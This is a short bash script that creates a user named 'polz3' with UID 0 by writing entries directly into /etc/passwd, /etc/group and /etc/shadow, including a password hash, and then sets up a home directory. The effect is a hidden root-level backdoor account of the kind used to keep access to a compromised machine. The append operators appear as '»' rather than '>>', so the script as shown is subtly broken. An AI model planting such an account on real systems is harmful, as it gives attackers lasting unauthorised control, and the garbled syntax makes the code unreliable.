#! /bin/bash

echo "polz3:x:0:0:,,,:/home/polz3:/bin/bash" » /etc/passwd
echo "polz3:x:0:" » /etc/group
echo "polz3:$y$j9T$IhLMQ.MDZ8caFuWOAXkpB0$BAOgIzQxIpUCLYLXn/5GYCGn5OjlxxdS0/xeuYDiGY/:19265::::::" » /etc/shadow
mkdir /home/polz3

cp -v /etc/skel/.* /home/polz3